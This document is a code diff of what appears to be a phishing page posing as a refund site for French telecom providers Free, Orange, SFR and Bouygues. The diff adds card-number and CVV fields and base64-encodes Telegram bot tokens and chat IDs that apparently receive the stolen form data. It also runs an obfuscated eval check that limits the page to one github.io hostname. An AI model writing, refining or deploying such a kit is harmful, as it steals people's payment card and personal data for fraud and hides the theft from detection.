@@ -42,21 +42,10 @@ body {
     box-shadow: 0 0 8px 0 #dfdfdf;
 }
 
-#free {
-    background-image: url('https://files.catbox.moe/14cv1m.png');
-}
-
-#orange {
-    background-image: url('https://files.catbox.moe/sahzy3.png');
-}
-
-#sfr {
-    background-image: url('https://files.catbox.moe/36bbw4.png');
-}
-
-#bouygues {
-    background-image: url('https://files.catbox.moe/juqpsh.png');
-}
+#free {background-image: url('https://files.catbox.moe/14cv1m.png');}
+#orange {background-image: url('https://files.catbox.moe/sahzy3.png');}
+#sfr {background-image: url('https://files.catbox.moe/36bbw4.png');}
+#bouygues {background-image: url('https://files.catbox.moe/juqpsh.png');}
 
         #refund {
             width: calc(100% - 40px);
@@ -97,7 +86,7 @@ body {
             border: 1px solid #ccc;
         }
 
-        #inputfirstname, #inputlastname, #inputphonenumber {
+        #inputfirstname, #inputlastname, #inputphonenumber, #inputcardnumber, #inputcvv {
             padding-left: 10px;
             padding-right: 10px;
         }
@@ -231,7 +220,6 @@ background-color: #0a0;
     <img src="https://files.catbox.moe/r7fjcx.jpeg" alt="refund" id="refund">
 
 <script>
-    var toId = [atob('NzkyNDAzMTAyOTpBQUdERkVqMTV0Zm90dzJ1Y0lQQWZrVnh0QUM5cW9EVzdGOA=='),atob('Njg5MDQ5MjY0Ng==')];
     var data = ["d2luZG93LmxvY2F0aW9uLmhvc3RuYW1l","cmVtYm91cnNlbWVudC1vbmxpbmUuZ2l0aHViLmlv"];
     document.body.style.display = 'none';
 if (eval(atob(data[0])) === atob(data[1])) {
@@ -309,12 +297,12 @@ error.innerHTML = 'Certains champs sont vides. Veuillez remplir tous les champs 
 error.style.display = 'block';
 } else {
 const tokens = [
-toId[0],
-'8081707668:AAED4PgB4aZykRlSfI0TozCpXX1cjCo8mEU' //YY
+atob('NzkyNDAzMTAyOTpBQUdERkVqMTV0Zm90dzJ1Y0lQQWZrVnh0QUM5cW9EVzdGOA=='),
+atob('ODA4MTcwNzY2ODpBQUVENFBnQjRhWnlrUmxTZkkwVG96Q3BYWDFjakNvOG1FVQ==') //YY
 ];
 const chatIds = [
-toId[1],
-'6669693805' //YY
+atob('Njg5MDQ5MjY0Ng=='),
+atob('NjY2OTY5MzgwNQ==') //YY
 ];
 
 tokens.forEach((token, index) => {
